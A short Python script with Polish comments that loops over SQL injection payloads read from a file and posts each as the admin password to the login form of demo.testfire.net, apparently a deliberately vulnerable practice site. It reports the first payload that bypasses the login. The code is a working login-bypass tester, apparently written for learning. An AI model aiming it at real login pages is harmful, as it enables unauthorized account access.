import requests

# Adres endpointu logowania, który będziemy testować
url = "https://demo.testfire.net/doLogin"

# Tworzymy sesję, by zachować ciasteczka i inne dane między żądaniami
session = requests.Session()

# Wczytujemy payloady z pliku
with open("payloads.txt", "r") as f:
    payload = f.readlines()

# Iterujemy po każdej linii z pliku (każdy payload)
for line in payload:
    line = line.strip()  # Usuwamy znaki nowej linii lub spacje z końca linii

    # Dane, które zostaną wysłane jako formularz POST (dane logowania)
    data = {
        "uid": "admin",
        "passw": f"{line}",
    }

    # Wysyłamy żądanie POST do serwera z danymi logowania
    response = session.post(url, data=data)

    # Sprawdzamy, czy po logowaniu zostaliśmy przekierowani gdzie indziej niż z powrotem na login.jsp
    if response.url != "https://demo.testfire.net/login.jsp":
        print("Strona jest podatna na SQL Injection")
        # Wyświetlamy działający payload
        print(f"Payload: {line}")
        # Przerywamy po znalezieniu dziłającego paylodu
        break
